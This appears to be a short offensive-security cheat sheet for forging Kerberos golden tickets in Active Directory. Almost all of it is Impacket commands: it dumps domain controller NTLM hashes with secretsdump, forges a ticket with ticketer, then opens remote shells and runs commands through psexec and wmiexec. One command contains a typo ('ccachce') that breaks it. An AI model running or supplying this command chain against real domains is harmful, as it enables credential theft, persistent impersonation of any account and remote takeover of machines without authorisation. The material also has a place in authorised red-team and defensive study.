# Unix Shell

## 01 - Create Golden Ticket

Get the Domain SID.

```
$ lookupsid.py <domain>/<username>:<password>@<IP>
```

Then dump the hashes.

```
$ secretsdump.py -just-dc-ntlm <domain>/<username>:<password>@<IP>
```

Convert it to golden ticket. Exclude the RID from the last 3 digits.

```
$ ticketer.py -nthashes <nt_hash> -domain-sid <sid_user> -domain <domain> <username_to_impersonate>
```

## 02 - Samba Suite Utils

TODO: refer to the links using `ktutil`

```
$ smbclient -U "<username>" -N --use-krb5-ccachce=/path/to/ticket.ccache -L //<IP>
```

## 03 - Impacket

Specify the pass of the golden ticket.

```
$ export KRB5CCNAME=/path/to/file.ccache
```

### 3.1 - SMBClient

```
$ smbclient.py -k -no-pass <domain>/<username>@<IP>
```

### 3.2 - PsExec

```
$ psexec.py -k -no-pass <domain>/<username>@<IP>
```

### 3.3 - WMIExec

```
$ wmiexec.py -k -no-pass <domain>/<username>@<IP>
```

---
## References

### Mubix

- [Malicious.link: Pass The Hash with Kerberos](https://room362.com/posts/2018/pass-the-hash-with-kerberos/)

### Hackndo

- [Hackndo: Kerberos Sliver Golden Tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/)

### Hacking Articles

- [Hacking Articles: Abusing Kerberos Using Impacket](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)